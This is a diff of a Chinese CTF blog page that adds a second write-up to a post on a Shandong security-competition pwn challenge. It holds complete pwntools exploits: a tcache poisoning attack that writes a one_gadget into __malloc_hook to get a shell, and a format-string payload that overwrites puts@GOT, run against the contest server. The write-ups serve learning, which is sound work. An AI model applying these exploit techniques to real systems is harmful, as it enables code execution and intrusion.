@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>堆溢出题目:bb_tcache · Binary Overflow</title>
+    <title>山东省安全竞赛pwn题 · Binary Overflow</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">Binary Overflow.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">堆溢出题目:bb_tcache</a>
+                <a href="#" class="post-name">山东省安全竞赛pwn题</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            堆溢出题目:bb_tcache
+            山东省安全竞赛pwn题
             <!-- 404 -->
             
         </h1>
@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">799</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -401,25 +401,20 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p></p><h1><strong>0x00 bb_tcache介绍</strong></h1><br>山大的题目 第一次接触堆的题目 以前只是看过堆溢出unlink相关的知识<br>山大题目连接<a href="http://47.105.148.65:4000/login?next=%2Fchallenges" target="_blank" rel="noopener">http://47.105.148.65:4000/login?next=%2Fchallenges</a><br>先简短解释下这道题堆题用到的知识malloc_hook堆钩<p></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook是在调用malloc函数之前检查的地方，正常情况下该地址下的值为0，如果该内存不为0，则会在malloc前先执行malloc_hook中的地址的内容 也就是说如果我们在这块内存写入one_gadget，就会在malloc前执行one_gadget。</span><br></pre></td></tr></table></figure>
-<p>每次调用堆的申请 释放等函数时候实际会先执行malloc_hook去鉴别 如果malloc_hook内存值不是0 就会执行malloc_hook中存放地址的内容<br><img src="https://i.loli.net/2018/11/11/5be84596ab863.png" alt=""><br>就是很正规的申请,释放和修改 看一下开了什么保护<br><img src="https://i.loli.net/2018/11/11/5be845e37d9e3.png" alt=""><br>保护全开 只能通过leak地址 拖入IDA 静态调试一下<br><img src="https://i.loli.net/2018/11/11/5be8461b930a2.png" alt=""><br>申请两字节 写入一字节 该elf文件是64位 刚好是写入一个地址的大小 下面开始exp的构造</p>
-<p></p><h1><strong>0x01 exp</strong></h1><br>先ldd一下看一下 该文件用的libc库<p></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd bb_tcache</span><br><span class="line">	linux-vdso.so.1 (0x00007ffeadfc1000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f654e38c000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f654e77d000)</span><br></pre></td></tr></table></figure>
-<p>用的就是<code>/lib/x86_64-linux-gnu/libc.so.6</code><br>再去找一下这个libc的one_gadget<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x4f2c5	execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322	execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c	execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure></p>
-<p>使用需要满足条件 可以一个一个试试 也可以去找当时的寄存器查条件 这里吧详细说明 我们选择使用最后一个<code>0x10a38c    execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</code></p>
-<p><img src="https://i.loli.net/2018/11/11/5be84722e4a15.png" alt=""><br>先把system地址得到 为了后面malloc_hook地址做准备<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'I think you might need this: '</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">system =int(sh.recvuntil(<span class="string">'Give'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> system</span><br></pre></td></tr></table></figure></p>
-<p>drop=True是为了不接受到Give 算是个recv的新知识<br>下面leak一下malloc_hook的地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libcbase = system - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> str(int(libcbase))</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> malloc_hook</span><br></pre></td></tr></table></figure></p>
-<p>得到地址后就通过修改堆fd指针 通过申请释放修改 再经过2次申请就就可以(不懂得看我前面uaf漏洞介绍)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(malloc_hook))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure></p>
-<p>第二次申请得到得就是malloc_hook地址 我们需要把one_gadget写入malloc_hook地址内 然后再去执行一次malloc函数 就会因为malloc_hook内地址不为0去执行malloc_hook地址内的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(libcbase+one_gadget))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>完整的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'I think you might need this: '</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">system =int(sh.recvuntil(<span class="string">'Give'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> system</span><br><span class="line">libcbase = system - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> str(int(libcbase))</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> malloc_hook</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(malloc_hook))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(libcbase+one_gadget))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+        <h1><strong>0x00 堆溢出:bb_tcache</strong></h1><br>山大的题目 第一次接触堆的题目 以前只是看过堆溢出unlink相关的知识<br>山大题目连接<a href="http://47.105.148.65:4000/login?next=%2Fchallenges" target="_blank" rel="noopener">http://47.105.148.65:4000/login?next=%2Fchallenges</a><br>先简短解释下这道题堆题用到的知识malloc_hook堆钩<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook是在调用malloc函数之前检查的地方，正常情况下该地址下的值为0，如果该内存不为0，则会在malloc前先执行malloc_hook中的地址的内容 也就是说如果我们在这块内存写入one_gadget，就会在malloc前执行one_gadget。</span><br></pre></td></tr></table></figure><br><br>每次调用堆的申请 释放等函数时候实际会先执行malloc_hook去鉴别 如果malloc_hook内存值不是0 就会执行malloc_hook中存放地址的内容<br><img src="https://i.loli.net/2018/11/11/5be84596ab863.png" alt=""><br>就是很正规的申请,释放和修改 看一下开了什么保护<br><img src="https://i.loli.net/2018/11/11/5be845e37d9e3.png" alt=""><br>保护全开 只能通过leak地址 拖入IDA 静态调试一下<br><img src="https://i.loli.net/2018/11/11/5be8461b930a2.png" alt=""><br>申请两字节 写入一字节 该elf文件是64位 刚好是写入一个地址的大小 下面开始exp的构造<br><h1><strong>0x01 exp</strong></h1><br>先ldd一下看一下 该文件用的libc库<br><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd bb_tcache</span><br><span class="line">	linux-vdso.so.1 (0x00007ffeadfc1000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f654e38c000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f654e77d000)</span><br></pre></td></tr></table></figure><br><br>用的就是<code>/lib/x86_64-linux-gnu/libc.so.6</code><br>再去找一下这个libc的one_gadget<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x4f2c5	execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322	execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c	execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><br><br>使用需要满足条件 可以一个一个试试 也可以去找当时的寄存器查条件 这里吧详细说明 我们选择使用最后一个<code>0x10a38c    execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</code><br><br><img src="https://i.loli.net/2018/11/11/5be84722e4a15.png" alt=""><br>先把system地址得到 为了后面malloc_hook地址做准备<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'I think you might need this: '</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">system =int(sh.recvuntil(<span class="string">'Give'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> system</span><br></pre></td></tr></table></figure><br><br>drop=True是为了不接受到Give 算是个recv的新知识<br>下面leak一下malloc_hook的地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libcbase = system - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> str(int(libcbase))</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> malloc_hook</span><br></pre></td></tr></table></figure><br><br>得到地址后就通过修改堆fd指针 通过申请释放修改 再经过2次申请就就可以(不懂得看我前面uaf漏洞介绍)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(malloc_hook))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><br><br>第二次申请得到得就是malloc_hook地址 我们需要把one_gadget写入malloc_hook地址内 然后再去执行一次malloc函数 就会因为malloc_hook内地址不为0去执行malloc_hook地址内的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(libcbase+one_gadget))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br><br>完整的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bb_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'I think you might need this: '</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">system =int(sh.recvuntil(<span class="string">'Give'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> system</span><br><span class="line">libcbase = system - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> str(int(libcbase))</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> malloc_hook</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(malloc_hook))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'You might need this to tamper something.\n'</span>,p64(libcbase+one_gadget))</span><br><span class="line">sh.sendlineafter(<span class="string">'4. quit!'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br><br><h1><strong>0x02 格式化字符串:repeater</strong></h1><br>一道格式化字符串的题 可以先去看一下我前面文件讲解的格式化字符串<br>先看一下文件的保护<br><br><img src="https://i.loli.net/2018/11/12/5be90dc0b1804.png" alt=""><br>开了NX 堆栈不可执行 我们再托人IDA看看<br><img src="https://i.loli.net/2018/11/12/5be90e12ee3a1.png" alt=""><br>很明显看到了格式化字符串漏洞的地方 并且后面还调用了puts函数(可以想到got表覆写)<br><img src="https://i.loli.net/2018/11/12/5be90e7c40a61.png" alt=""><br>还有一个getflag函数 里面可以使用命令cmd 去看一下cmd是什么命令<br><img src="https://i.loli.net/2018/11/12/5be90ebc43b7e.png" alt=""><br>刚好是<code>cat flag</code> 所有可以通过格式化字符串漏洞把 got表中Puts函数地址写为getflag函数就可以 先看一下getflag命令的地址是什么<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:080485D5                 sub     esp, 0Ch</span><br><span class="line">.text:080485D8                 lea     eax, (cmd - 804A000h)[ebx] ; <span class="string">"/bin/cat flag"</span></span><br><span class="line">.text:080485DE                 push    eax             ; <span class="built_in">command</span></span><br><span class="line">.text:080485DF                 call    _system</span><br></pre></td></tr></table></figure><br><br>可以看到从080485d5开始了system的操作 去看了一下got表中puts的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">got.plt:0804A014 off_804A014     dd offset puts          ; DATA XREF: _puts</span><br></pre></td></tr></table></figure><br><br>发现前前2字节是一样的 只需要去覆盖低字节的2个就可以<br>85d5转10进制是34261 下面开始构造exp<br><h1><strong>0x03 exp</strong></h1>
 
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">puts_got=<span class="number">0x0804a014</span></span><br><span class="line">get_Flag=<span class="number">0x080485d5</span></span><br><span class="line">client=remote(<span class="string">'47.105.148.65'</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#client=process('./repeater')</span></span><br><span class="line"><span class="comment">#.%34261x%7$n1234</span></span><br><span class="line">client.sendlineafter(<span class="string">'your msg:'</span>,<span class="string">'%34261x%7$hn'</span>+p32(puts_got))</span><br><span class="line"><span class="comment">#gdb.attach(client)</span></span><br><span class="line">client.interactive()</span><br></pre></td></tr></table></figure>
     </article>
     <!-- license  -->
     
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/11/12/格式化字符串-repeater/" title="格式化字符串:repeater">
+                    <div class="nextTitle">格式化字符串:repeater</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -560,7 +555,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-number">1.</span> <span class="toc-text">0x00 bb_tcache介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-number">2.</span> <span class="toc-text">0x01 exp</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-number">1.</span> <span class="toc-text">0x00 堆溢出:bb_tcache</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-number">2.</span> <span class="toc-text">0x01 exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-number">3.</span> <span class="toc-text">0x02 格式化字符串:repeater</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#undefined"><span class="toc-number">4.</span> <span class="toc-text">0x03 exp</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -709,9 +704,52 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 12
+        Total : 13
         </div>
         <!-- search  -->
         
@@ -727,7 +765,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2018/11/11/堆溢出题目-bb-tacche/">堆溢出题目:bb_tcache</a>
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href="/2018/11/12/格式化字符串-repeater/">格式化字符串:repeater</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2018/11/11/堆溢出题目-bb-tacche/">山东省安全竞赛pwn题</a>
         </li>
     
     
@@ -792,13 +835,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="题目"><span class="iconfont-archer">&#xe606;</span>题目</span>
-    
         <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
     
         <span class="sidebar-tag-name" data-tags="搭建"><span class="iconfont-archer">&#xe606;</span>搭建</span>
     
-        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
+        <span class="sidebar-tag-name" data-tags="题目"><span class="iconfont-archer">&#xe606;</span>题目</span>
     
         <span class="sidebar-tag-name" data-tags="资料"><span class="iconfont-archer">&#xe606;</span>资料</span>
     
